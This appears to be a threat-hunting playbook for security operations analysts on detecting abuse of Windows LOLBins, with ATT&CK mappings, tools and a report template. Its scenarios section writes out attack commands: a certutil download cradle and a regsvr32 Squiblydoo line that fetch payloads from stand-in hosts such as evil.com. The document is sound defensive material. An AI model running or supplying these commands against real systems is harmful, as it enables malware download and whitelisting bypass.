---
name: soc-hunting-lolbins
description: - When investigating fileless malware campaigns that bypass traditional AV - During proactive threat hunts targeting defense evasion techniques - When EDR alerts fire on legitimate binaries executing unusual child processes - After threat intelligence reports indicate LOLBin abuse in active campaigns - During red team/purple team exercises validati
domain: cybersecurity
---
------|-------------|
| LOLBin | Legitimate OS binary abused by attackers for malicious purposes |
| LOLBAS Project | Community-curated list of Windows LOLBins, LOLLibs, and LOLScripts |
| T1218 | MITRE ATT&CK - Signed Binary Proxy Execution |
| T1218.001 | Compiled HTML File (mshta.exe) |
| T1218.002 | Control Panel (control.exe) |
| T1218.003 | CMSTP |
| T1218.005 | Mshta |
| T1218.010 | Regsvr32 |
| T1218.011 | Rundll32 |
| T1197 | BITS Jobs (bitsadmin.exe) |
| T1140 | Deobfuscate/Decode Files (certutil.exe) |
| Proxy Execution | Using trusted binaries to execute untrusted code |
| Fileless Attack | Attack that operates primarily in memory without dropping files |

## Tools & Systems

| Tool | Purpose |
|------|---------|
| CrowdStrike Falcon | EDR telemetry and process tree analysis |
| Microsoft Defender for Endpoint | Advanced hunting with KQL queries |
| Splunk | SIEM log aggregation and SPL queries |
| Elastic Security | Detection rules and timeline investigation |
| Sysmon | Detailed process creation and network logging |
| LOLBAS Project | Reference database of LOLBin capabilities |
| Sigma Rules | Generic detection rule format for LOLBins |
| Velociraptor | Endpoint forensic collection and hunting |

## Common Scenarios

1. **Certutil Download Cradle**: Adversary uses `certutil.exe -urlcache -split -f http://malicious.com/payload.exe` to download malware, bypassing web proxies that allow certutil traffic.
2. **Mshta HTA Execution**: Attacker delivers HTA file via email that executes VBScript payload through `mshta.exe`, which is a signed Microsoft binary.
3. **Rundll32 DLL Proxy Load**: Malicious DLL loaded via `rundll32.exe shell32.dll,ShellExec_RunDLL` to proxy execution through a trusted binary.
4. **Regsvr32 Squiblydoo**: Remote SCT file executed via `regsvr32 /s /n /u /i:http://evil.com/file.sct scrobj.dll` bypassing application whitelisting.
5. **BITSAdmin Persistence**: Adversary creates BITS transfer job to repeatedly download and execute payloads using `bitsadmin /transfer`.

## Output Format

```
Hunt ID: TH-LOLBIN-[DATE]-[SEQ]
Hypothesis: [Stated hypothesis]
LOLBins Investigated: [List of binaries]
Time Range: [Start] - [End]
Data Sources: [EDR, Sysmon, SIEM]
Findings:
  - [Finding 1 with evidence]
  - [Finding 2 with evidence]
Anomalies Detected: [Count]
True Positives: [Count]
False Positives: [Count]
IOCs Identified: [List]
Detection Rules Created/Updated: [List]
Recommendations: [Next steps]
```